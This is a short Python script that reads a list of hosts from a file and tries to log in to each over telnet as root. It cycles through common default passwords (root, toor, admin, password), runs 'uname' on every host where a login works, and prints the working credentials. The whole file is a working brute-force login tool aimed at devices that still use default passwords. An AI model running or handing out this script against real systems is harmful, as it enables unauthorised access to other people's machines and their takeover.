import telnetlib
import sys

# Command to be executed on clients
payload = "uname"

# Credentials
passwords = [b"root", b"toor", b"admin", b"password"]
username = b"root\n"  # Multiple usernames are not supported

if len(sys.argv) != 2:
    print("Usage: tel_login.py filename")
    sys.exit()

filename = sys.argv[1]


def process_client(client):
    for password in passwords:
        try:
            tn = telnetlib.Telnet(client)
            tn.read_until(b"login: ")
            tn.write(username)
            tn.read_until(b"Password: ")
            tn.write(password + b"\n")
            tn.read_until(b"$ ")
            tn.write(b"uname\n")
            result = tn.read_until(b"$ ").decode('ascii')
            tn.write(b"exit\n")
            tn.close()
            print(f"\033[32m[+] {client}: {username.decode('ascii')} / {password.decode('ascii')}\033[0m")
            print(result)
            break
        except:
            print(f"\033[31m[-] {client}: {username.decode('ascii')} / {password.decode('ascii')}\033[0m")


with open(filename, 'r') as f:
    clients = f.read().splitlines()

for client in clients:
    process_client(client)
